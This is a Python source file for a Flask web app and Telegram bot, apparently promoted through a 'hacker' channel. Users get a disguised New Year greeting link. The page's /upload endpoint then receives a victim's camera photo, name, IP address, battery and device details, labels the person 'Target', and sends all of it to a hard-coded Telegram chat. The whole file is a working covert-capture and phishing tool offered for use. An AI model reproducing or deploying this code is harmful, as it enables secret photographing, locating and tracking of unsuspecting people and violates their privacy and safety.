import os
import base64
import threading
from flask import Flask, render_template, request, jsonify
import telebot
from telebot import types

app = Flask(__name__)

# सेटिंग्स
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = "7162565886"
bot = telebot.TeleBot(BOT_TOKEN)

# चैनल की जानकारी
CHANNELS = ["@hackerscolonytech"]

def check_join(user_id):
    try:
        for channel in CHANNELS:
            status = bot.get_chat_member(channel, user_id).status
            if status in ['creator', 'administrator', 'member']:
                return True
        return False
    except Exception as e:
        # अगर बॉट एडमिन नहीं है, तो यहाँ एरर आएगा
        print(f"Admin Error: {e}")
        return False

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    
    if check_join(user_id):
        # अगर जॉइन किया है - Professional English Messages
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("✨ GENERATE MAGIC LINK", url="https://happy-wishing-you.onrender.com")
        btn2 = types.InlineKeyboardButton("👨‍💻 CONTACT ADMIN", url="https://t.me/Roshanali000")
        markup.add(btn1, btn2)
        
        bot.send_message(message.chat.id, 
            "<b>ACCESS GRANTED! ✅</b>\n\nWelcome to the Elite Dashboard. Your personalized New Year 2026 Audit link is ready below.", 
            parse_mode='HTML', reply_markup=markup)
    else:
        # अगर जॉइन नहीं किया है - Force Join
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn_join = types.InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/hackerscolonytech")
        btn_verify = types.InlineKeyboardButton("🔄 VERIFY NOW", callback_data="verify")
        markup.add(btn_join, btn_verify)
        
        bot.send_message(message.chat.id, 
            "<b>ACCESS DENIED! ❌</b>\n\nTo use this high-end AI bot, you must be a member of our official channel. Join and click Verify.", 
            parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.data == "verify":
        if check_join(call.from_user.id):
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ Verification Failed! Please join first.", show_alert=True)

# --- वेबसाइट डेटा रिसीवर ---
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json
        name = data.get('name', 'Unknown')
        img_data = data.get('image')
        info = data.get('info', {})
        label = data.get('label', 'Audit Capture')

        branding = "<b>━━━━━━━━━━━━━━━━━━━━━━\n✨ Created by Roshan Ali ✨\n━━━━━━━━━━━━━━━━━━━━━━</b>"
        
        report = (
            f"🛡️ <b>SYSTEM AUDIT: {label}</b>\n\n"
            f"👤 <b>Target:</b> {name}\n"
            f"🔋 <b>Battery:</b> {info.get('battery')}\n"
            f"🌐 <b>IP Address:</b> {request.remote_addr}\n"
            f"📱 <b>Device:</b> {info.get('platform')}\n\n"
            f"{branding}"
        )

        if img_data:
            img_bytes = base64.b64decode(img_data.split(',')[1])
            bot.send_photo(CHAT_ID, img_bytes, caption=report, parse_mode='HTML')
        return jsonify({"status": "success"})
    except:
        return jsonify({"status": "error"}), 500

def run_bot():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
    
